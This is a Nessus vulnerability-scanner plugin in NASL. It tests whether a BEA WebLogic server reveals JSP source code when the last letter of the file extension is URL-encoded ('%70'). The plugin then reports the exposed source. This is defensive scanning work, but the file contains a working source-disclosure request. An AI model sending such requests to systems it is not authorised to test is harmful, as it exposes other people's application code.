#
# This script was written by Gregory Duchemin <plugin@intranode.com> 
#
# See the Nessus Scripts License for details
#

#### REGISTER SECTION ####


include("compat.inc");

if(description)
{

script_id(10715);
script_bugtraq_id(2527);
  script_osvdb_id(593);

script_version("$Revision: 1.42 $");
#script_cve_id("");

#Name used in the client window.
script_name(english:"BEA WebLogic Hex Encoded Request JSP Source Disclosure");

#Description appearing in the Nessus client window when clicking on the name.

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of BEA WebLogic installed on the remote host may be
tricked into revealing the source code of JSP scripts by using simple
URL encoding of characters in the filename extension." );
 # https://web.archive.org/web/20010427013000/http://archives.neohapsis.com/archives/bugtraq/2001-03/0463.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2cd7750b" );
 script_set_attribute(attribute:"solution", value:
"Use the official patch available at http://www.bea.com/ to upgrade to
WebLogic version 5.1.0 SP 8 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/08/13");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/03/28");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();



 
#Summary appearing in the tooltips, only one line.

summary["english"]="BEA WebLogic may be tricked into revealing the source code of JSP scripts.";
script_summary(english:summary["english"]);



#Test among the firsts scripts, no risk to harm the remote host.

script_category(ACT_ATTACK);
script_copyright(english:"(C) 2001-2016 INTRANODE");

#Category in wich attack must be stored.

family["english"]="CGI abuses";
script_family(english:family["english"]);
 


#from wich scripts this one is depending:
#Services Discovery +
#Default error page configured on Web sites not showing a usual 404
#thus to prevent any false positive answer.


script_dependencie("find_service1.nasl", "www_fingerprinting_hmap.nasl", "http_version.nasl", "webmirror.nasl");
 
script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

#### ATTACK CODE SECTION ####

function check(req, port)
{
  local_var poison, request, request2, report, response, response2, signature, url;

  poison = req;
  poison = ereg_replace(string:poison, pattern:"(.*js)p$",
		    replace:"\1%70");
  request = http_get(item:poison, port:port); 
  response = http_keepalive_send_recv(port:port, data:request, bodyonly:TRUE);
  if ( response == NULL ) exit(0);

  #signature of Jsp.
  signature = "<%=";
  if (signature >< response) 
  {
    # Unless we're paranoid, make sure the string doesn't normally appear.
    if (report_paranoia < 2)
    {
      request2 = http_get(item:req, port:port); 
      response2 = http_keepalive_send_recv(port:port, data:request2, bodyonly:TRUE);
      if ( response2 == NULL ) exit(0);
      if ( signature >< response2) return(0);
    }

    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:poison), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here is the JSP source uncovered :\n",
          "\n",
          response
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
  return(0);
}

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "WebLogic" >!< sig ) exit(0);

foreach dir (cgi_dirs())
{
  check(req:string(dir, "/index.jsp"), port:port);
}

# Try with a known jsp file
files = get_kb_list(string("www/", port, "/content/extensions/jsp"));
if (isnull(files))exit(0);
files = make_list(files);
check(req:files[0], port:port);
